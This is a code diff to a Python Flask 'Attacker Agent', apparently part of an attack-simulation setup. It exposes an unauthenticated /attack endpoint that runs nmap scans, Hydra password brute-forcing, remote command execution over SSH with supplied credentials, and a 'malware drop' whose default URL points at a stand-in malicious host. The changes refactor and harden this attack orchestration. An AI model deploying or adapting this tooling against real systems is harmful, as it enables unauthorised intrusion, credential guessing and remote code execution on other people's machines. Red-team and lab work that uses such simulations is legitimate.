@@ -16,7 +16,7 @@ def run_nmap_scan(target_ip, scan_type, ports):
     print(f"Esecuzione Nmap {scan_type} su {target_ip} porte {ports}")
     try:
         # Usiamo sudo per permettere scansioni raw come -sS
-        result = subprocess.run(['sudo', 'nmap', scan_type, '-p', ports, target_ip], capture_output=True, text=True, check=True)
+        result = subprocess.run(['nmap', scan_type, '-p', ports, target_ip], capture_output=True, text=True, check=True)
         print("Nmap Scan Output:\n", result.stdout)
         return {"status": "success", "output": result.stdout, "error": result.stderr}
     except subprocess.CalledProcessError as e:
@@ -29,6 +29,10 @@ def run_hydra_bruteforce(target_ip, service, username_list, password_list):
     """Esegue un attacco brute-force con Hydra."""
     print(f"Esecuzione Hydra brute-force su {target_ip} per servizio {service}")
     # Creazione file temporanei per liste username/password
+    
+    if not username_list or not password_list:
+        return {"status": "error", "message": "Username e password list non possono essere vuote."}
+    
     user_file = "/tmp/hydra_users.txt"
     pass_file = "/tmp/hydra_pass.txt"
     with open(user_file, "w") as f:
@@ -38,14 +42,20 @@ def run_hydra_bruteforce(target_ip, service, username_list, password_list):
 
     try:
         # Usiamo sudo per hydra se necessario (dipende dalle configurazioni di Hydra)
-        result = subprocess.run(['sudo', 'hydra', '-L', user_file, '-P', pass_file, target_ip, service], capture_output=True, text=True, check=True)
+        result = subprocess.run(['hydra', '-L', user_file, '-P', pass_file, target_ip, service], capture_output=True, text=True, check=True, timeout=120)
         print("Hydra Brute-Force Output:\n", result.stdout)
         return {"status": "success", "output": result.stdout, "error": result.stderr}
     except subprocess.CalledProcessError as e:
         print(f"Hydra Error: {e.stderr}")
         return {"status": "error", "message": f"Hydra failed: {e.stderr}"}
+    except subprocess.TimeoutExpired as e:
+        print(f"Hydra Timeout: {e}")
+        return {"status": "error", "message": "Hydra execution timed out."}
     except FileNotFoundError:
         return {"status": "error", "message": "Hydra non trovato. Assicurati che sia installato e nel PATH."}
+    except Exception as e:
+        print(f"Errore durante l'esecuzione di Hydra: {e}")
+        return {"status": "error", "message": f"Errore durante l'esecuzione di Hydra: {str(e)}"}
     finally:
         # Pulizia file temporanei
         if os.path.exists(user_file): os.remove(user_file)
@@ -72,6 +82,7 @@ def simulate_lateral_movement_ssh(target_ip, username, password, command):
     except paramiko.SSHException as e:
         return {"status": "error", "message": f"Errore SSH: {str(e)}"}
     except Exception as e:
+        print(f"Errore generico durante SSH: {e}")
         return {"status": "error", "message": f"Errore generico durante SSH: {str(e)}"}
 
 def simulate_malware_drop(target_ip, malware_url="http://malicious.example.com/malware.exe"):
@@ -110,7 +121,7 @@ def simulate_malware_drop(target_ip, malware_url="http://malicious.example.com/m
 @app.route('/attack', methods=['POST'])
 def handle_attack():
     data = request.json
-    attack_type = data.get('type')
+    attack_type = data.get('attack_type')
     target_ip = data.get('target_ip')
     params = data.get('params', {})
 
@@ -119,27 +130,54 @@ def handle_attack():
 
     print(f"Received attack request: {attack_type} on {target_ip} with params {params}")
 
-    # Esegue l'attacco in un thread per non bloccare la risposta HTTP
-    def run_attack_in_thread(attack_func, *args, **kwargs):
-        result = attack_func(*args, **kwargs)
-        # Qui potresti inviare il risultato all'orchestratore o loggarlo in un file
-        print(f"Attack completed with result: {result}")
+    def run_attack_wrapper(attack_func, *func_args):
+        """
+        Funzione wrapper per eseguire la funzione di attacco in un thread
+        e gestire il logging del risultato.
+        """
+        try:
+            result = attack_func(*func_args)
+            print(f"Attack completed with result: {result}")
+        except Exception as e:
+            print(f"Errore durante l'esecuzione dell'attacco {attack_func.__name__}: {e}")
+            # Potresti loggare l'errore in un file o un sistema di monitoraggio
 
-    if attack_type == "port_scan":
-        threading.Thread(target=run_attack_in_thread, args=(run_nmap_scan, target_ip, params.get('scan_type', '-sS'), params.get('ports', '1-1000'))).start()
-        return jsonify({"status": "accepted", "message": f"Port scan avviato su {target_ip}"})
-    elif attack_type == "brute_force":
-        threading.Thread(target=run_attack_in_thread, args=(run_hydra_bruteforce, target_ip, params.get('service'), params.get('username_list', []), params.get('password_list', [])) ).start()
-        return jsonify({"status": "accepted", "message": f"Brute force avviato su {target_ip}"})
-    elif attack_type == "lateral_movement_ssh":
-        threading.Thread(target=run_attack_in_thread, args=(simulate_lateral_movement_ssh, target_ip, params.get('username'), params.get('password'), params.get('command'))).start()
-        return jsonify({"status": "accepted", "message": f"Lateral movement via SSH avviato su {target_ip}"})
-    elif attack_type == "malware_drop":
-        threading.Thread(target=run_attack_in_thread, args=(simulate_malware_drop, target_ip, params.get('malware_url'))).start()
-        return jsonify({"status": "accepted", "message": f"Malware drop simulato su {target_ip}"})
+    # Dizionario che mappa i tipi di attacco alle funzioni e ai loro argomenti
+    attack_handlers = {
+        "port_scan": {
+            "func": run_nmap_scan,
+            "args": (target_ip, params.get('scan_type', '-sS'), params.get('ports', '1-1000')),
+            "message": f"Port scan avviato su {target_ip}"
+        },
+        "brute_force": {
+            "func": run_hydra_bruteforce,
+            "args": (
+                target_ip,
+                params.get('service', 'ssh'),
+                [u.strip() for u in params.get('username_list', '').split(',') if u.strip()] if isinstance(params.get('username_list'), str) else params.get('username_list', []),
+                [p.strip() for p in params.get('password_list', '').split(',') if p.strip()] if isinstance(params.get('password_list'), str) else params.get('password_list', [])
+            ),
+            "message": f"Brute force avviato su {target_ip}"
+        },
+        "lateral_movement_ssh": {
+            "func": simulate_lateral_movement_ssh,
+            "args": (target_ip, params.get('username'), params.get('password'), params.get('command')),
+            "message": f"Lateral movement via SSH avviato su {target_ip}"
+        },
+        "malware_drop": {
+            "func": simulate_malware_drop,
+            "args": (target_ip, params.get('malware_url')),
+            "message": f"Malware drop simulato su {target_ip}"
+        }
+    }
+
+    handler = attack_handlers.get(attack_type)
+
+    if handler:
+        threading.Thread(target=run_attack_wrapper, args=(handler["func"], *handler["args"])).start()
+        return jsonify({"status": "accepted", "message": handler["message"]})
     else:
         return jsonify({"status": "error", "message": "Tipo di attacco non supportato."}), 400
-
 @app.route('/status', methods=['GET'])
 def get_status():
     return jsonify({"status": "Attacker Agent running", "timestamp": time.time()})
